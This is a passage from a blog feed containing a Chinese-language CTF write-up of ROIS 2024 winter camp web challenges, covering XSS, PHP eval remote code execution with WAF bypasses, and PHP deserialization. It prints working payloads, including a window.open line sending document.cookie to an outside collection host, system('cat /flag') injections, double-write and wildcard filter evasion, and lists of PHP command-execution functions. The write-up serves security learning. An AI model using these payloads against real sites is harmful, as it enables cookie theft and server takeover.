class="title function_">execute</span>(<span class="title function_">atob</span>(p));</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><code>alert(eval(payload));</code>发现输入的指令最后通过eval执行，并且没有对其进行任何的过滤，题目的flag最后在<code>robot用户</code>的cookie中，直接构造playroad，<code>1+window.open(&#39;http://xxxxxxxxxxxx.com/?$&#123;document.cookie&#125;&#39; )</code>,借助最后<code>webhook.site</code>最后在url可以拿到flag</p><p><img src="/./rois-2024-winter-camp/65d5d56771c2a.png" alt="838d1a28281bcaaa52476e97b0416668"></p><h3 id="ez-rce"><a href="#ez-rce" class="headerlink" title="ez_rce"></a>ez_rce</h3><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//你知道php有什么危险函数吗？</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$param</span>;</span><br><span class="line">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">evalTest</span>(<span class="params"><span class="variable">$param</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$param</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (@<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>] === <span class="string">&quot;ok&quot;</span>)&#123;</span><br><span class="line">    back<span class="title class_">Door</span>::<span class="title function_ invoke__">evalTest</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>eval</code> 函数可以动态执行字符串中的 PHP 代码</p><p><code>backDoor::evalTest($_GET[&#39;b&#39;]);</code>调用 <code>backDoor</code> 类的静态方法 <code>evalTest</code>，执行 <code>eval($param);</code>语句，flag文件一般位于根目录</p><p>由此可以构造出playroad：<code>?a=ok&amp;b=system(&#39;cat /flag&#39;);</code>其中的<code>system()</code>函数可以执行系统命令，与此函数类似的还有<code>system（），exec（），shell_exec（），passthru（）， pcntl_exec（）， popen（）， proc_open（），反引号</code></p><h3 id="ez-rce-plus"><a href="#ez-rce-plus" class="headerlink" title="ez_rce_plus?"></a>ez_rce_plus?</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (@<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_KEY&#x27;</span>] !== <span class="string">&quot;Nzc2NTZjNjU2MzZmNmQ2NTVmNzQ2ZjVmNzI2ZjY5NzMyMQ==&quot;</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;authentication failed!!&quot;</span>);</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$nameFunction</span> = <span class="title function_ invoke__">htmlspecialchars</span>(@<span class="variable">$_POST</span>[<span class="string">&quot;function&quot;</span>]); <span class="keyword">unset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;function&quot;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$nameFunction</span>) <span class="variable">$nameFunction</span> = <span class="title function_ invoke__">htmlspecialchars</span>(@<span class="variable">$_POST</span>[<span class="string">&quot;action&quot;</span>]); <span class="keyword">unset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;action&quot;</span>]);</span><br><span class="line">    <span class="variable">$nameFunction</span> = <span class="title function_ invoke__">waf</span>(<span class="variable">$nameFunction</span>);</span><br><span class="line">    <span class="variable">$nameFunction</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;/&quot;</span>,<span class="variable">$nameFunction</span>);</span><br><span class="line">    <span class="variable">$nameFunction</span> = <span class="variable">$nameFunction</span>[<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$nameFunction</span>)&#123;</span><br><span class="line">        <span class="variable">$params</span> = <span class="keyword">array</span>();</span><br><span class="line">        <span class="title function_ invoke__">forEach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$item</span>)&#123;</span><br><span class="line">            <span class="variable">$item</span> = <span class="title function_ invoke__">waf</span>(<span class="variable">$item</span>);</span><br><span class="line">            <span class="title function_ invoke__">array_push</span>(<span class="variable">$params</span>, <span class="variable">$item</span>); <span class="keyword">unset</span>(<span class="variable">$_POST</span>[<span class="variable">$key</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$base64</span> = <span class="literal">false</span>; <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_BASE64&quot;</span>]))&#123; <span class="variable">$base64</span> = <span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_BASE64&quot;</span>] === <span class="string">&#x27;true&#x27;</span> ? <span class="literal">true</span> : <span class="literal">false</span>; &#125;</span><br><span class="line">        <span class="variable">$params</span> = <span class="title function_ invoke__">join</span>(<span class="string">&quot;&#x27;,&#x27;&quot;</span>, <span class="variable">$params</span>); <span class="variable">$eval</span> = <span class="variable">$nameFunction</span>.<span class="string">&quot;(&#x27;&quot;</span>.<span class="variable">$params</span>.<span class="string">&quot;&#x27;)&quot;</span>; <span class="variable">$return</span> = <span class="keyword">eval</span>(<span class="string">&#x27;return &#x27;</span>.<span class="variable">$eval</span>.<span class="string">&quot;;&quot;</span>); <span class="keyword">echo</span> <span class="title function_ invoke__">jsonEncode</span>(<span class="variable">$return</span>, <span class="variable">$base64</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">jsonEncode</span>(<span class="params"><span class="variable">$value</span>, <span class="variable">$base64_encode</span> = <span class="literal">true</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$value</span> = <span class="title function_ invoke__">json_encode</span>(<span class="variable">$value</span>, JSON_PRETTY_PRINT);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$base64_encode</span>) <span class="variable">$value</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$value</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$input</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;flag&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$word</span>) &#123;</span><br><span class="line">        <span class="variable">$input</span> = <span class="title function_ invoke__">str_replace</span>(<span class="variable">$word</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$input</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$input</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先解决</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (@<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_KEY&#x27;</span>] !== <span class="string">&quot;Nzc2NTZjNjU2MzZmNmQ2NTVmNzQ2ZjVmNzI2ZjY5NzMyMQ==&quot;</span>)</span><br></pre></td></tr></table></figure><p>在http加入请求头<code>key: Nzc2NTZjNjU2MzZmNmQ2NTVmNzQ2ZjVmNzI2ZjY5NzMyMQ==</code>(这一串最后解码后发现是<code>welecome_to_rois!</code> 小彩蛋？)。</p><p>然后读代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$nameFunction</span> = <span class="title function_ invoke__">htmlspecialchars</span>(@<span class="variable">$_POST</span>[<span class="string">&quot;function&quot;</span>]); <span class="keyword">unset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;function&quot;</span>]);</span><br><span class="line">   <span class="keyword">if</span>(!<span class="variable">$nameFunction</span>) <span class="variable">$nameFunction</span> = <span class="title function_ invoke__">htmlspecialchars</span>(@<span class="variable">$_POST</span>[<span class="string">&quot;action&quot;</span>]); <span class="keyword">unset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;action&quot;</span>]);</span><br><span class="line">   <span class="variable">$nameFunction</span> = <span class="title function_ invoke__">waf</span>(<span class="variable">$nameFunction</span>);</span><br><span class="line">   <span class="variable">$nameFunction</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;/&quot;</span>,<span class="variable">$nameFunction</span>);</span><br><span class="line">   <span class="variable">$nameFunction</span> = <span class="variable">$nameFunction</span>[<span class="number">1</span>];</span><br><span class="line">   <span class="keyword">if</span>(<span class="variable">$nameFunction</span>)&#123;</span><br><span class="line">       <span class="variable">$params</span> = <span class="keyword">array</span>();</span><br><span class="line">       <span class="title function_ invoke__">forEach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$item</span>)&#123;</span><br><span class="line">           <span class="variable">$item</span> = <span class="title function_ invoke__">waf</span>(<span class="variable">$item</span>);</span><br><span class="line">           <span class="title function_ invoke__">array_push</span>(<span class="variable">$params</span>, <span class="variable">$item</span>); <span class="keyword">unset</span>(<span class="variable">$_POST</span>[<span class="variable">$key</span>]);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="variable">$base64</span> = <span class="literal">false</span>; <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_BASE64&quot;</span>]))&#123; <span class="variable">$base64</span> = <span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_BASE64&quot;</span>] === <span class="string">&#x27;true&#x27;</span> ? <span class="literal">true</span> : <span class="literal">false</span>; &#125;</span><br><span class="line">       <span class="variable">$params</span> = <span class="title function_ invoke__">join</span>(<span class="string">&quot;&#x27;,&#x27;&quot;</span>, <span class="variable">$params</span>); <span class="variable">$eval</span> = <span class="variable">$nameFunction</span>.<span class="string">&quot;(&#x27;&quot;</span>.<span class="variable">$params</span>.<span class="string">&quot;&#x27;)&quot;</span>; <span class="variable">$return</span> = <span class="keyword">eval</span>(<span class="string">&#x27;return &#x27;</span>.<span class="variable">$eval</span>.<span class="string">&quot;;&quot;</span>); <span class="keyword">echo</span> <span class="title function_ invoke__">jsonEncode</span>(<span class="variable">$return</span>, <span class="variable">$base64</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>最后<code>eval</code>函数执行的是<code>$_POST[&quot;action&quot;]</code>中从左到右第一个<code>/</code>后的字段，并最后拼接字段<code>$eval</code>形成这样一个结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">函数名(&#x27;参数名&#x27;);</span><br></pre></td></tr></table></figure><p>此时函数就可以考虑利用<code>system()</code>等函数读取根目录下的flag文件，这个过程中就会遇到一个waf函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function waf($input) &#123;</span><br><span class="line">    $blacklist = [&#x27;system&#x27;, &#x27;exec&#x27;, &#x27;flag&#x27;];</span><br><span class="line"></span><br><span class="line">    foreach ($blacklist as $word) &#123;</span><br><span class="line">        $input = str_replace($word, &#x27;&#x27;, $input);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return $input;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对<code>&#39;system&#39;, &#39;exec&#39;, &#39;flag&#39;</code>三个敏感词进行替换，这种可以直接进行双写绕过即可（即<code>system</code>写成<code>syssystemtem</code>）</p><p>最后的<code>playroad</code>可以写成<code>action=syssystemtem&amp;wells=cat /flflagag</code>,其中第二个名称可以随便设立</p><h3 id="ez-rce-with-full-waf"><a href="#ez-rce-with-full-waf" class="headerlink" title="ez_rce_with_full_waf?"></a>ez_rce_with_full_waf?</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (@<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_KEY&#x27;</span>] !== <span class="string">&quot;Nzc2NTZjNjU2MzZmNmQ2NTVmNzQ2ZjVmNzI2ZjY5NzMyMQ==&quot;</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;authentication failed!!&quot;</span>);</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$nameFunction</span> = <span class="title function_ invoke__">htmlspecialchars</span>(@<span class="variable">$_POST</span>[<span class="string">&quot;function&quot;</span>]); <span class="keyword">unset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;function&quot;</span>]);</span><br><span class="line">    <span class="variable">$nameFunction</span> = <span class="title function_ invoke__">waf</span>(<span class="variable">$nameFunction</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$nameFunction</span>) <span class="variable">$nameFunction</span> = <span class="title function_ invoke__">htmlspecialchars</span>(@<span class="variable">$_POST</span>[<span class="string">&quot;action&quot;</span>]); <span class="keyword">unset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;action&quot;</span>]);</span><br><span class="line">    <span class="variable">$nameFunction</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;/&quot;</span>,<span class="variable">$nameFunction</span>);</span><br><span class="line">    <span class="variable">$nameFunction</span> = <span class="variable">$nameFunction</span>[<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$nameFunction</span>)&#123;</span><br><span class="line">        <span class="variable">$params</span> = <span class="keyword">array</span>();</span><br><span class="line">        <span class="title function_ invoke__">forEach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$item</span>)&#123;</span><br><span class="line">            <span class="variable">$item</span> = <span class="title function_ invoke__">waf</span>(<span class="variable">$item</span>);</span><br><span class="line">            <span class="title function_ invoke__">array_push</span>(<span class="variable">$params</span>, <span class="variable">$item</span>); <span class="keyword">unset</span>(<span class="variable">$_POST</span>[<span class="variable">$key</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$base64</span> = <span class="literal">false</span>; <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_BASE64&quot;</span>]))&#123; <span class="variable">$base64</span> = <span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_BASE64&quot;</span>] === <span class="string">&#x27;true&#x27;</span> ? <span class="literal">true</span> : <span class="literal">false</span>; &#125;</span><br><span class="line">        <span class="variable">$params</span> = <span class="title function_ invoke__">join</span>(<span class="string">&quot;&#x27;,&#x27;&quot;</span>, <span class="variable">$params</span>); <span class="variable">$eval</span> = <span class="variable">$nameFunction</span>.<span class="string">&quot;(&#x27;&quot;</span>.<span class="variable">$params</span>.<span class="string">&quot;&#x27;)&quot;</span>; <span class="variable">$return</span> = <span class="keyword">eval</span>(<span class="string">&#x27;return &#x27;</span>.<span class="variable">$eval</span>.<span class="string">&quot;;&quot;</span>); <span class="keyword">echo</span> <span class="title function_ invoke__">jsonEncode</span>(<span class="variable">$return</span>, <span class="variable">$base64</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">jsonEncode</span>(<span class="params"><span class="variable">$value</span>, <span class="variable">$base64_encode</span> = <span class="literal">true</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$value</span> = <span class="title function_ invoke__">json_encode</span>(<span class="variable">$value</span>, JSON_PRETTY_PRINT);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$base64_encode</span>) <span class="variable">$value</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$value</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$input</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;flag&#x27;</span> ,<span class="string">&#x27;`&#x27;</span> ,<span class="string">&#x27;eval&#x27;</span> ,<span class="string">&#x27;call&#x27;</span> ,<span class="string">&#x27;$&#x27;</span> ,<span class="string">&#x27;php&#x27;</span> ,<span class="string">&#x27;require&#x27;</span> , <span class="string">&#x27;_&#x27;</span> , <span class="string">&#x27;file&#x27;</span> ,<span class="string">&#x27;show&#x27;</span> , <span class="string">&#x27;include&#x27;</span>, <span class="string">&#x27;\&#x27;&#x27;</span> , <span class="string">&#x27;&quot;&#x27;</span> , <span class="string">&#x27;.&#x27;</span>  , <span class="string">&#x27;&lt;&#x27;</span> , <span class="string">&#x27;&gt;&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$word</span>) &#123;</span><br><span class="line">        <span class="variable">$input</span> = <span class="title function_ invoke__">str_replace</span>(<span class="variable">$word</span>, <span class="string">&#x27;hack!&#x27;</span>, <span class="variable">$input</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$input</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>与上一题不同的是本题的waf()函数，限制更多且不能进行双写绕过(敏感词会变成<code>hack！</code>，而不是去除)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$input</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;flag&#x27;</span> ,<span class="string">&#x27;`&#x27;</span> ,<span class="string">&#x27;eval&#x27;</span> ,<span class="string">&#x27;call&#x27;</span> ,<span class="string">&#x27;$&#x27;</span> ,<span class="string">&#x27;php&#x27;</span> ,<span class="string">&#x27;require&#x27;</span> , <span class="string">&#x27;_&#x27;</span> , <span class="string">&#x27;file&#x27;</span> ,<span class="string">&#x27;show&#x27;</span> , <span class="string">&#x27;include&#x27;</span>, <span class="string">&#x27;\&#x27;&#x27;</span> , <span class="string">&#x27;&quot;&#x27;</span> , <span class="string">&#x27;.&#x27;</span>  , <span class="string">&#x27;&lt;&#x27;</span> , <span class="string">&#x27;&gt;&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$word</span>) &#123;</span><br><span class="line">        <span class="variable">$input</span> = <span class="title function_ invoke__">str_replace</span>(<span class="variable">$word</span>, <span class="string">&#x27;hack!&#x27;</span>, <span class="variable">$input</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$input</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果直接使用<code>$_POST[&quot;function&quot;]</code>可以考虑用其他的执行系统命令的函数<code>shell_exec（），passthru（）， pcntl_exec（）， popen（）， proc_open（）</code>，但在代码中，有一处漏洞：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(!$nameFunction) $nameFunction = htmlspecialchars(@$_POST[&quot;action&quot;]); unset($_POST[&quot;action&quot;]);</span><br></pre></td></tr></table></figure><p>此时的<code>$nameFunction</code>，没有进行任何的waf过滤，因此可以不设置<code>$_POST[&quot;function&quot;]</code>参数而使用<code>$_POST[&quot;action&quot;]</code>，对于<code>flag</code>这个词的绕过，可以使用<code>linux</code>系统的通配符如<code>？</code>、<code>[]</code>，将<code>flag</code>写成<code>fla?</code></p><p>最后的<code>playroad</code>可以写成<code>action=system&amp;wells=cat /fla?</code>,其中第二个名称可以随便设立</p><h3 id="unserialize-1"><a href="#unserialize-1" class="headerlink" title="unserialize-1"></a>unserialize-1</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;ROIS&#123;test&#125;&#x27;</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;password!=<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;password;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;nice&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;input&#x27;</span>]);</span><br></pre></td></tr></table></figure><p><code>unserialize()</code>函数进行反序列化的函数（序列化与反序列化概念：<a href="https://zhuanlan.zhihu.com/p/316200445">一文搞懂序列化与反序列化</a>）</p><p>然后有关于<code>__wakeup()</code>和<code>__toString()</code>的两个魔术方法</p><p><code>__wakeup()</code>在反序列的过程中会自动调用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;password!=<span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果此反序列化后的对象的<code>password</code>变量不为空，会打变量<code>password</code>反之打印<code>name</code>变量</p><p><code>__toString()</code>在将对象被作为字符串中过程中会自动调用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public function __toString() &#123;</span><br><span class="line">    global $flag;</span><br><span class="line">    echo $flag;</span><br><span class="line">    return &quot;nice&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>触发<code>__toString()</code>就可以打印出flag，所以本题的关键就是将对象被作为字符串中过程中会自动调用，而唯一有可能的就是反序列化过程中自动触发的<code>echo</code></p><p>联想出将这个对象的<code>name变量</code>的值也是对象，<code>password变量</code>的值为空即可，即</p><p>使用<code>s:45:&quot;O:4:&quot;Name&quot;:2:&#123;s:4:&quot;name&quot;;N;s:8:&quot;password&quot;;N;&#125;&quot;</code>即可</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;WEEK1&quot;&gt;&lt;a href=&quot;#WEEK1&quot; class=&quot;headerlink&quot; title=&quot;WEEK1&quot;&gt;&lt;/a&gt;WEEK1&lt;/h1&gt;&lt;h2 id=&quot;Web&quot;&gt;&lt;a href=&quot;#Web&quot; class=&quot;headerlink&quot; title=&quot;Web&quot;&gt;&lt;/</summary>
      
    
    
    
    <category term="CTF" scheme="https://we11s.github.io/categories/CTF/"/>
    
    
    <category term="CTF-WriteUp" scheme="https://we11s.github.io/tags/CTF-WriteUp/"/>
    
  </entry>
  
  <entry>
    <title>Kali优化</title>
    <link href="https://we11s.github.io/posts/1455897523/"/>
    <id>https://we11s.github.io/posts/1455897523/</id>
    <published>2024-01-11T15:22:44.000Z</published>
    <updated>2024-01-13T16:13:15.261Z</updated>
    
